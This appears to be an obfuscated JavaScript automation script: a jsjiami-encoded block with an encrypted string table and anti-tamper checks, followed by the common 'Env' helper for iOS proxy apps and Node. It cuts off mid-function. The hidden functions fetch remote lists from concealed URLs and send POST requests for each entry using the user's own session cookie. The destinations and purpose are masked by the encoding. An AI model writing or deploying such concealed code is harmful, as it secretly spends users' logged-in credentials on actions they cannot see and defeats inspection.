e6KyU5rCF5aWr6LaC77+k6K6N5qGT5pyp57yG6Le86Yea6K21','fsKxw6dSwpE1','w6zDhsKrPgk=','w7zDgsKuOMKQw5M=','R8OUEhxO','w6HDt8KTMcKH','AEYeG8Op','GH/CiMK7w7Q=','f8O2w5fDnsOoTTwDWcO2w6fDnHbDrGXDhMO2w6fDtkjDjRwZecKJwoTCvsKswrI5URbDlCdkwq3DixLDr1RfwrvDrEI7wqtswr7DtirCp8OBFlAQw6VCEWYXw6PCoA==','wpPCvMKWwok2w4otwpTDgMOqw6ZjwrDDucOiw4jDniUQw4TDsm5Jw5nDpT1mwoTDoMK9w4x6w7V2WsO4wrHDiUYawpwnCFbDhFB/BQXDq8OwTETDisKmHcK1w77Di8Onw7s0wqs6wrDCpHPCsMOkF0hSdMODDEjDr2XCvXXDs39yPGjDmVocwqk9wokODV/CmcOoHEvDsWpsw783wocfwqDDvcKcw57DmMOiwo/DsUkFw7fDkijCtl7CpMO7bMKoJmpPw7BhYgPDqsKOGg5DTxbDp8KNwprDoFLCnE4WVsKgwqhawpc7wrMneik=','TDklCFk=','w5VJNmcx','IMOGCsKgw6I=','LXXCrMK1w7Q=','wprDijkqwqc=','VcKmw4RPwqY=','HMKuwq/CiMKH','ezAow6Mr','w67Dq8KLHiA=','wp8Lw4zDrio=','DcOowqLDv3Y=','LsOUdzxt','VTQa','wq3Co8KAwoot','E8OyEhgw','w5dgwqzCqsK5','F3sdG8OW','wrdtwrzDiMOK','w550wqTDtcON','wrLCvMKL','YsO6Rgw=','w6zCuibCi+iuluaxm+Wlgei2lO++v+iuuOagguaeu+e/hOi1mumGseiuuw==','w4hgw4HCk08=','w7RjwqnCmMKWFEA=','w6UFwo8UaQ==','T8KWwpbDvXA=','AMO9ZgxfFBE=','BF86w5TCnRU=','w5HDjULCuVw=','wqrDhMKpaBs=','CMO1Ywh3','woTCisK9wqYA','ScO/QgXDrA==','DFsgw5LCrhh8','C8OfJ8KA','VD0yHFjCmw==','CsOdKmHCuyxM','w5bDn8KsGA==','PsORKwU=','wrfDqwEgwrE=','K8OPwqDDq3FJ','QU9Lwr/DrA==','w63Coi8fVA==','w6FtwpvDssOVw5c=','WhHDnhtq','HsOIwozDt2s=','e8K4w5NawpA=','CG3Ch8Kdw4c=','L8OUwrPDnnABG2IIBHgKUCPCvD8OKMK2fgjCqsKvVQjDohDCtWkhwqvCv8OCwo3Cn0TDv8OGPcK6wqs0wrE6YsOKCF5vw4zCsMOsw71nacKKVcKLWMOCSU0=','wpZKwo7Dl8Ovw4kmw6/Dk3MRDWVVQATDv8O4wrPCrBPCr8KtwqHCp8OWwqLCiUHDocOnd8O0SkLCp8O5CgnChsOxJXRbwq7DvMOCKU/ChMKSwrPCo0cbV8KiJ8KOw65hwrAswpTCjsOiHD7CjsKsHMOzcETDpMORIwZ+w6pcRjkbWsK4dsKzBMKoPsOfwrLDsMKEDcKML8KILWMRbDJ5w5UGwp3DqsKqwpvDuMKqHcKPw5ciW8O4w6s2wozDtEMFw5HCpMOxZcOiw7DCpkJTUH/CtMKbG8KtEMKuwrF6dTvDv8Kow4vDi37DksObYyln','AncI','KydnCcOD','eMKKwo/Dv0s=','w5pYwpPCt8Kn','dyTDjBl6','wqTCksKKwq8c','LHvChQ==','wqLCmhvCpw==','EhA+w4Xorp/ms6XlpKzotonvvoborZfmoqHmno7nv7/ot47ph5zorZU=','wrPCqsOQasKm','Xyk+K0g=','LsOBICE7','w7zDgsKu','VcOyCVI=','wr0Gw7TCruisr+axlOWku+i3te++qOivi+agvuadnee+vui0lemGg+isqA==','aQTDnjd7QsK2','wonCkcOsV8K1','w7HDgcKlHsKXw4jCug==','IcKhwq7CvsKVRzk=','w74yw43Cgw==','w7kLwpo=','YwTDhzM=','HcK+wqfDh+ivvuayheWkvOi0lu+8leiskeajteaet+e+iOi0numGguivqg==','c8Ojw5fDj8OcEmc=','wr1/a0hu','w4LDiE/CqVDCpRY=','w7TDjMK9HMKlw4TCqg==','TMKQPsKi','W8OtQQjDnA==','wqDCrS/CsxU=','w5RGwojDu8O/','wpPDk1LCuGHCsw==','YMO0TA==','w43DhU7Crw==','w5nCscOObeisp+awhuWmoOi1kO+9n+iuuOagqeadiOe9lOi2semEieitmg==','Z8KMwqHDiGA=','csOkw77DlW4=','RSvDoR1l','wrjCqMKEVcKdewPCmH3DuE9Q','wp7DjEXCkXrColdHw4MqWsKDwpzDsMKfw7nDhcOfwrB3wqg8w6JYPsOHYsKGR8O1VsO5woE=','DWYIGMOcw4VTw4nDpzx+bMKyw73DjsKYwrQDwpk=','UsO3GAMqFBISw6DDusKWVBAGScK9bg==','wqfCnhPCskx4HMOYw4Uq','w4omak7DoMOmYcO6w7TDvsOnSkR9wqVUw67DgsO5w43DqsKZwpxWworDnR0Bw6o0wpDDhgc=','bjvCt8Knw5NnLjI8fsKXNxE=','wobCvyPCgw==','w4Eye1LDucK+acOew7XDvsOnABU3w6QIw6zDkMK2wpnCpsODwoEdw4PDuUBKwoRVwp/CqG7CusKww5w7ScKowr9eXcOvwoFwHUnCmCDDosO8w7N3wrTDqV/DliHDrcK3wqwXw5XCosKcbsODwpHCrsKhfirDh8KSYFNH','P2NkwqrDoA==','wpHDgRQtwrbDo8Ol','asO3RAbDvA==','wqcOw7PDpy4=','ScOyClPCjiI=','wqQxw4nDoTbCnBA=','ZU9xworDjsO8','w75qwp3DhcOCw6ZtdMOu','d8Kww6Nlwpo3LsOCwowqw7rCog==','bhDDgzIB','w4vDkFfCulbDtl3Dpm4Yw6rDg8KHI8O8R8KeVUouJsKWPBXCjHtqO8KLTzLCtcKXJw==','wrHCiMK+PcKi','w5FGw4TCsFY=','wr/Diw4bwoY=','yjsjiawrmbEi.cormf.Ytv6JHKyknL=='];(function(_0x5a14a4,_0x43e1a6,_0xe0b6f9){var _0x1b89d9=function(_0x381cb7,_0x54c224,_0x20a336,_0x2c7645,_0x30e634){_0x54c224=_0x54c224>>0x8,_0x30e634='po';var _0x1dcdd0='shift',_0x1473be='push';if(_0x54c224<_0x381cb7){while(--_0x381cb7){_0x2c7645=_0x5a14a4[_0x1dcdd0]();if(_0x54c224===_0x381cb7){_0x54c224=_0x2c7645;_0x20a336=_0x5a14a4[_0x30e634+'p']();}else if(_0x54c224&&_0x20a336['replace'](/[ywrbErfYtJHKyknL=]/g,'')===_0x54c224){_0x5a14a4[_0x1473be](_0x2c7645);}}_0x5a14a4[_0x1473be](_0x5a14a4[_0x1dcdd0]());}return 0x78af0;};var _0x320ee8=function(){var _0x701c9f={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x469da3,_0x1b009b,_0x450b04,_0x3e380e){_0x3e380e=_0x3e380e||{};var _0x164483=_0x1b009b+'='+_0x450b04;var _0x115233=0x0;for(var _0x115233=0x0,_0x8d71fd=_0x469da3['length'];_0x115233<_0x8d71fd;_0x115233++){var _0x45f84a=_0x469da3[_0x115233];_0x164483+=';\x20'+_0x45f84a;var _0x4aa389=_0x469da3[_0x45f84a];_0x469da3['push'](_0x4aa389);_0x8d71fd=_0x469da3['length'];if(_0x4aa389!==!![]){_0x164483+='='+_0x4aa389;}}_0x3e380e['cookie']=_0x164483;},'removeCookie':function(){return'dev';},'getCookie':function(_0xa851d7,_0x19266a){_0xa851d7=_0xa851d7||function(_0x2d1fde){return _0x2d1fde;};var _0x367b38=_0xa851d7(new RegExp('(?:^|;\x20)'+_0x19266a['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x152737=typeof _0xodx=='undefined'?'undefined':_0xodx,_0x3c4670=_0x152737['split'](''),_0x3907f1=_0x3c4670['length'],_0x36bc0d=_0x3907f1-0xe,_0x10e2a7;while(_0x10e2a7=_0x3c4670['pop']()){_0x3907f1&&(_0x36bc0d+=_0x10e2a7['charCodeAt']());}var _0x46d4c1=function(_0x1bff3f,_0x43a62d,_0x14c528){_0x1bff3f(++_0x43a62d,_0x14c528);};_0x36bc0d^-_0x3907f1===-0x524&&(_0x10e2a7=_0x36bc0d)&&_0x46d4c1(_0x1b89d9,_0x43e1a6,_0xe0b6f9);return _0x10e2a7>>0x2===0x14b&&_0x367b38?decodeURIComponent(_0x367b38[0x1]):undefined;}};var _0x4c3e65=function(){var _0x43d533=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x43d533['test'](_0x701c9f['removeCookie']['toString']());};_0x701c9f['updateCookie']=_0x4c3e65;var _0x53f721='';var _0x4efc61=_0x701c9f['updateCookie']();if(!_0x4efc61){_0x701c9f['setCookie'](['*'],'counter',0x1);}else if(_0x4efc61){_0x53f721=_0x701c9f['getCookie'](null,'counter');}else{_0x701c9f['removeCookie']();}};_0x320ee8();}(_0xabe7,0x82,0x8200));var _0xbc9d=function(_0x322590,_0x3abd9f){_0x322590=~~'0x'['concat'](_0x322590);var _0x18b888=_0xabe7[_0x322590];if(_0xbc9d['LKSWMa']===undefined){(function(){var _0x2c35bf=function(){var _0x27e9de;try{_0x27e9de=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5ce2ce){_0x27e9de=window;}return _0x27e9de;};var _0x285d0e=_0x2c35bf();var _0x5757da='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x285d0e['atob']||(_0x285d0e['atob']=function(_0x38d033){var _0x6645b3=String(_0x38d033)['replace'](/=+$/,'');for(var _0x2cb6cd=0x0,_0x298152,_0x104a1c,_0x4ca384=0x0,_0x399d95='';_0x104a1c=_0x6645b3['charAt'](_0x4ca384++);~_0x104a1c&&(_0x298152=_0x2cb6cd%0x4?_0x298152*0x40+_0x104a1c:_0x104a1c,_0x2cb6cd++%0x4)?_0x399d95+=String['fromCharCode'](0xff&_0x298152>>(-0x2*_0x2cb6cd&0x6)):0x0){_0x104a1c=_0x5757da['indexOf'](_0x104a1c);}return _0x399d95;});}());var _0x565951=function(_0x423f5e,_0x3abd9f){var _0x34b009=[],_0x15967a=0x0,_0x32a3ad,_0x45f432='',_0x1afe85='';_0x423f5e=atob(_0x423f5e);for(var _0x2e59c5=0x0,_0x3dee26=_0x423f5e['length'];_0x2e59c5<_0x3dee26;_0x2e59c5++){_0x1afe85+='%'+('00'+_0x423f5e['charCodeAt'](_0x2e59c5)['toString'](0x10))['slice'](-0x2);}_0x423f5e=decodeURIComponent(_0x1afe85);for(var _0x3cda25=0x0;_0x3cda25<0x100;_0x3cda25++){_0x34b009[_0x3cda25]=_0x3cda25;}for(_0x3cda25=0x0;_0x3cda25<0x100;_0x3cda25++){_0x15967a=(_0x15967a+_0x34b009[_0x3cda25]+_0x3abd9f['charCodeAt'](_0x3cda25%_0x3abd9f['length']))%0x100;_0x32a3ad=_0x34b009[_0x3cda25];_0x34b009[_0x3cda25]=_0x34b009[_0x15967a];_0x34b009[_0x15967a]=_0x32a3ad;}_0x3cda25=0x0;_0x15967a=0x0;for(var _0x59357e=0x0;_0x59357e<_0x423f5e['length'];_0x59357e++){_0x3cda25=(_0x3cda25+0x1)%0x100;_0x15967a=(_0x15967a+_0x34b009[_0x3cda25])%0x100;_0x32a3ad=_0x34b009[_0x3cda25];_0x34b009[_0x3cda25]=_0x34b009[_0x15967a];_0x34b009[_0x15967a]=_0x32a3ad;_0x45f432+=String['fromCharCode'](_0x423f5e['charCodeAt'](_0x59357e)^_0x34b009[(_0x34b009[_0x3cda25]+_0x34b009[_0x15967a])%0x100]);}return _0x45f432;};_0xbc9d['oeFsop']=_0x565951;_0xbc9d['rvgEWR']={};_0xbc9d['LKSWMa']=!![];}var _0xd27bdc=_0xbc9d['rvgEWR'][_0x322590];if(_0xd27bdc===undefined){if(_0xbc9d['wjwvPz']===undefined){var _0x29ce3e=function(_0x18fcaa){this['bdEtUK']=_0x18fcaa;this['hWtzUH']=[0x1,0x0,0x0];this['qOmmfd']=function(){return'newState';};this['bPhnEP']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['sbOrjs']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x29ce3e['prototype']['ugEuDG']=function(){var _0x1d63cb=new RegExp(this['bPhnEP']+this['sbOrjs']);var _0x51a989=_0x1d63cb['test'](this['qOmmfd']['toString']())?--this['hWtzUH'][0x1]:--this['hWtzUH'][0x0];return this['xAPQvv'](_0x51a989);};_0x29ce3e['prototype']['xAPQvv']=function(_0x3c6c81){if(!Boolean(~_0x3c6c81)){return _0x3c6c81;}return this['meMwbF'](this['bdEtUK']);};_0x29ce3e['prototype']['meMwbF']=function(_0xd59e1b){for(var _0x3d6645=0x0,_0x509a44=this['hWtzUH']['length'];_0x3d6645<_0x509a44;_0x3d6645++){this['hWtzUH']['push'](Math['round'](Math['random']()));_0x509a44=this['hWtzUH']['length'];}return _0xd59e1b(this['hWtzUH'][0x0]);};new _0x29ce3e(_0xbc9d)['ugEuDG']();_0xbc9d['wjwvPz']=!![];}_0x18b888=_0xbc9d['oeFsop'](_0x18b888,_0x3abd9f);_0xbc9d['rvgEWR'][_0x322590]=_0x18b888;}else{_0x18b888=_0xd27bdc;}return _0x18b888;};var _0x2e3119=function(){var _0x1df308=!![];return function(_0x2daeb2,_0x242f1e){var _0x2491cc=_0x1df308?function(){if(_0x242f1e){var _0x43a6b1=_0x242f1e['apply'](_0x2daeb2,arguments);_0x242f1e=null;return _0x43a6b1;}}:function(){};_0x1df308=![];return _0x2491cc;};}();var _0x247460=_0x2e3119(this,function(){var _0x485be8=function(){return'\x64\x65\x76';},_0x3fea56=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x27e9c8=function(){var _0x4c836c=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4c836c['\x74\x65\x73\x74'](_0x485be8['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x223f8d=function(){var _0x4fc934=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x4fc934['\x74\x65\x73\x74'](_0x3fea56['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x9d7739=function(_0x1ef967){var _0x1e4b80=~-0x1>>0x1+0xff%0x0;if(_0x1ef967['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x1e4b80)){_0x5533ca(_0x1ef967);}};var _0x5533ca=function(_0x3f99a6){var _0x315026=~-0x4>>0x1+0xff%0x0;if(_0x3f99a6['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x315026){_0x9d7739(_0x3f99a6);}};if(!_0x27e9c8()){if(!_0x223f8d()){_0x9d7739('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x9d7739('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x9d7739('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x247460();function wuzhi(_0x436c90){var _0x119bed={'QVqbH':function(_0x8a6ba7,_0x2673b2){return _0x8a6ba7!==_0x2673b2;},'OSnqo':_0xbc9d('0','^wGY'),'jhCpx':function(_0x57f4f6){return _0x57f4f6();},'ZLmTz':function(_0x27502f,_0x27eb95){return _0x27502f===_0x27eb95;},'CcEZJ':_0xbc9d('1','3NYo'),'bSVem':function(_0x28bce4,_0x3a8317){return _0x28bce4*_0x3a8317;},'hPSFR':_0xbc9d('2','5H^Z'),'QCQqO':_0xbc9d('3','SER%'),'OfvUE':_0xbc9d('4','q(ng'),'QZlfx':_0xbc9d('5','wmYk'),'ocSMP':_0xbc9d('6','C#qN'),'RGSNj':_0xbc9d('7','uz4&'),'uPgQx':function(_0x429927,_0x48e829){return _0x429927(_0x48e829);},'cmyLp':_0xbc9d('8','DLFk'),'Aehjd':_0xbc9d('9','C#qN'),'urZac':_0xbc9d('a','uz4&'),'goRjU':_0xbc9d('b','^tIz')};var _0x58d77e=$[_0xbc9d('c','XhdV')][Math[_0xbc9d('d','vOr]')](_0x119bed[_0xbc9d('e','8sg^')](Math[_0xbc9d('f','4V(7')](),$[_0xbc9d('10','8sg^')][_0xbc9d('11','DPRj')]))];let _0xa5d745=_0x436c90[_0xbc9d('12','Mt8l')];let _0x2dc0bb=_0x436c90[_0xbc9d('13',']ikN')];let _0x5932ee=_0xbc9d('14','3NYo')+_0x58d77e+';\x20'+cookie;let _0x3c3197={'url':_0xbc9d('15','1*Hr'),'headers':{'Host':_0x119bed[_0xbc9d('16','5H^Z')],'Content-Type':_0x119bed[_0xbc9d('17','&Tvf')],'origin':_0x119bed[_0xbc9d('18','XhdV')],'Accept-Encoding':_0x119bed[_0xbc9d('19','M^*@')],'Cookie':_0x5932ee,'Connection':_0x119bed[_0xbc9d('1a',']ikN')],'Accept':_0x119bed[_0xbc9d('1b','Qw1I')],'User-Agent':$[_0xbc9d('1c','M^*@')]()?process[_0xbc9d('1d','zV&y')][_0xbc9d('1e','Qw1I')]?process[_0xbc9d('1f','o0&6')][_0xbc9d('20','qwB2')]:_0x119bed[_0xbc9d('21','#mMj')](require,_0x119bed[_0xbc9d('22','u5oQ')])[_0xbc9d('23','e^T8')]:$[_0xbc9d('24','SWsZ')](_0x119bed[_0xbc9d('25','gBe&')])?$[_0xbc9d('26','uz4&')](_0x119bed[_0xbc9d('27','3NYo')]):_0x119bed[_0xbc9d('28','^wGY')],'referer':_0xbc9d('29','gBe&')+_0xa5d745+_0xbc9d('2a','SER%')+_0x2dc0bb+_0xbc9d('2b','o0&6'),'Accept-Language':_0x119bed[_0xbc9d('2c','8cua')]},'body':_0xbc9d('2d','^tIz')+_0xa5d745+_0xbc9d('2e','j@Tr')};return new Promise(_0x172e11=>{if(_0x119bed[_0xbc9d('2f','wmYk')](_0x119bed[_0xbc9d('30','5H^Z')],_0x119bed[_0xbc9d('31','e^T8')])){$[_0xbc9d('32','q(ng')](_0x3c3197,(_0x7d1400,_0xfb0ae8,_0x30cbfe)=>{if(_0x119bed[_0xbc9d('33','gBe&')](_0x119bed[_0xbc9d('34','uz4&')],_0x119bed[_0xbc9d('35','q&mo')])){console[_0xbc9d('36','zV&y')]($[_0xbc9d('37','#T4H')]+_0xbc9d('38','4V(7'));}else{try{if(_0x7d1400){console[_0xbc9d('39','3NYo')]($[_0xbc9d('3a','Qw1I')]+_0xbc9d('3b',']ikN'));}else{}}catch(_0x3d43dc){$[_0xbc9d('3c',']ikN')](_0x3d43dc);}finally{_0x119bed[_0xbc9d('3d','j@Tr')](_0x172e11);}}});}else{$[_0xbc9d('3e','v*EU')](e);}});}function shuye72(){var _0x13c9c3={'taysu':function(_0x2f2633){return _0x2f2633();},'GxDXE':function(_0x17042b){return _0x17042b();},'mkHEH':function(_0x5b51d4,_0x26dcfd){return _0x5b51d4!==_0x26dcfd;},'maNAb':_0xbc9d('3f','wmYk'),'jgAdd':_0xbc9d('40','v*EU'),'YnuWU':_0xbc9d('41','q(ng'),'IaFoC':function(_0x35a3f8,_0x45a9eb){return _0x35a3f8<_0x45a9eb;},'hEcPQ':function(_0x2bd186,_0x59f1a9){return _0x2bd186(_0x59f1a9);},'ZVili':function(_0x371b5b,_0x205b65){return _0x371b5b===_0x205b65;},'JHeQu':_0xbc9d('42','DLFk'),'spljw':_0xbc9d('43','o0&6'),'ZBPio':_0xbc9d('44','HI79')};return new Promise(_0x512062=>{var _0x2d572b={'bWgfk':function(_0xfbae1d){return _0x13c9c3[_0xbc9d('45','q&mo')](_0xfbae1d);},'GbqSh':function(_0x1d576e){return _0x13c9c3[_0xbc9d('46','qwB2')](_0x1d576e);},'riasy':function(_0x38f95d,_0x86dd24){return _0x13c9c3[_0xbc9d('47','8cua')](_0x38f95d,_0x86dd24);},'lHHvI':_0x13c9c3[_0xbc9d('48','DLFk')],'SvXBj':_0x13c9c3[_0xbc9d('49','XhdV')],'HeTRV':function(_0x407499){return _0x13c9c3[_0xbc9d('4a',']ikN')](_0x407499);},'liqeo':_0x13c9c3[_0xbc9d('4b','lgTS')],'Edilb':function(_0x1acb35,_0x16c008){return _0x13c9c3[_0xbc9d('4c','#T4H')](_0x1acb35,_0x16c008);},'GFynr':function(_0x2fb4c0,_0x4f304d){return _0x13c9c3[_0xbc9d('4d','j@Tr')](_0x2fb4c0,_0x4f304d);}};if(_0x13c9c3[_0xbc9d('4e','8sg^')](_0x13c9c3[_0xbc9d('4f','3B^P')],_0x13c9c3[_0xbc9d('50','zV&y')])){$[_0xbc9d('51','#T4H')]({'url':_0x13c9c3[_0xbc9d('52','HI79')],'headers':{'User-Agent':_0x13c9c3[_0xbc9d('53','yzwC')]}},async(_0x32dc8c,_0x5171a4,_0x396bf0)=>{var _0x532247={'ZYQFZ':function(_0x23b851){return _0x2d572b[_0xbc9d('54','#mMj')](_0x23b851);}};if(_0x2d572b[_0xbc9d('55','q(ng')](_0x2d572b[_0xbc9d('56','e^T8')],_0x2d572b[_0xbc9d('57','Mt8l')])){try{if(_0x32dc8c){console[_0xbc9d('58','HI79')]($[_0xbc9d('59','vOr]')]+_0xbc9d('5a','C#qN'));}else{await _0x2d572b[_0xbc9d('5b','&Tvf')](shuye73);$[_0xbc9d('5c','#mMj')]=JSON[_0xbc9d('5d','3D8$')](_0x396bf0);if(_0x2d572b[_0xbc9d('5e','Qw1I')]($[_0xbc9d('5f','zV&y')][_0xbc9d('60','s@OT')],0x0)){if(_0x2d572b[_0xbc9d('61','1*Hr')](_0x2d572b[_0xbc9d('62','SWsZ')],_0x2d572b[_0xbc9d('63','zV&y')])){_0x532247[_0xbc9d('64','HI79')](_0x512062);}else{for(let _0x2864bc=0x0;_0x2d572b[_0xbc9d('65','vOr]')](_0x2864bc,$[_0xbc9d('66','s@OT')][_0xbc9d('67','8cua')][_0xbc9d('68','q&mo')]);_0x2864bc++){let _0x646078=$[_0xbc9d('69','1jyS')][_0xbc9d('6a','v*EU')][_0x2864bc];await $[_0xbc9d('6b','yzwC')](0x3e8);await _0x2d572b[_0xbc9d('6c','XhdV')](wuzhi,_0x646078);}}}}}catch(_0x4e4a7d){$[_0xbc9d('6d','3B^P')](_0x4e4a7d);}finally{_0x2d572b[_0xbc9d('6e','DPRj')](_0x512062);}}else{_0x2d572b[_0xbc9d('6f','D$79')](_0x512062);}});}else{$[_0xbc9d('70','Mt8l')](e);}});}function shuye73(){var _0x595b90={'JZNNv':function(_0x289c71,_0x43ebcd){return _0x289c71!==_0x43ebcd;},'zAfOF':_0xbc9d('71','3NYo'),'gqbPd':_0xbc9d('72','3B^P'),'WvjaR':function(_0x20ea2c,_0x181b0d){return _0x20ea2c!==_0x181b0d;},'lVYqt':_0xbc9d('73',']ikN'),'YDtLX':_0xbc9d('74','DLFk'),'ZsVFi':function(_0x40fb47){return _0x40fb47();},'nBJTg':_0xbc9d('75','3B^P'),'EuxqB':_0xbc9d('76','e^T8')};return new Promise(_0x455240=>{$[_0xbc9d('77','q(ng')]({'url':_0x595b90[_0xbc9d('78','u5oQ')],'headers':{'User-Agent':_0x595b90[_0xbc9d('79','Qw1I')]}},async(_0x2e23b6,_0x38e0e7,_0x254e36)=>{if(_0x595b90[_0xbc9d('7a','#mMj')](_0x595b90[_0xbc9d('7b','3NYo')],_0x595b90[_0xbc9d('7c','HI79')])){if(_0x2e23b6){console[_0xbc9d('7d','DLFk')]($[_0xbc9d('7e','C#qN')]+_0xbc9d('7f','#T4H'));}else{}}else{try{if(_0x2e23b6){if(_0x595b90[_0xbc9d('80','lLbV')](_0x595b90[_0xbc9d('81','q&mo')],_0x595b90[_0xbc9d('82','yzwC')])){if(_0x2e23b6){console[_0xbc9d('83','v*EU')]($[_0xbc9d('84','4V(7')]+_0xbc9d('85','[K3*'));}else{$[_0xbc9d('86','3NYo')]=JSON[_0xbc9d('87','lLbV')](_0x254e36);$[_0xbc9d('88','v*EU')]=$[_0xbc9d('89','lgTS')][_0xbc9d('8a','[K3*')];}}else{console[_0xbc9d('8b','3D8$')]($[_0xbc9d('8c','3NYo')]+_0xbc9d('8d','Qw1I'));}}else{$[_0xbc9d('8e','o0&6')]=JSON[_0xbc9d('8f','l6L2')](_0x254e36);$[_0xbc9d('90','1*Hr')]=$[_0xbc9d('91','v*EU')][_0xbc9d('92','fdUC')];}}catch(_0x4202ce){if(_0x595b90[_0xbc9d('93','vOr]')](_0x595b90[_0xbc9d('94','C#qN')],_0x595b90[_0xbc9d('95','Mt8l')])){$[_0xbc9d('96','SER%')](_0x4202ce);}else{console[_0xbc9d('97','vOr]')]($[_0xbc9d('98','1*Hr')]+_0xbc9d('99','lLbV'));}}finally{_0x595b90[_0xbc9d('9a','Qw1I')](_0x455240);}}});});};_0xodx='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete 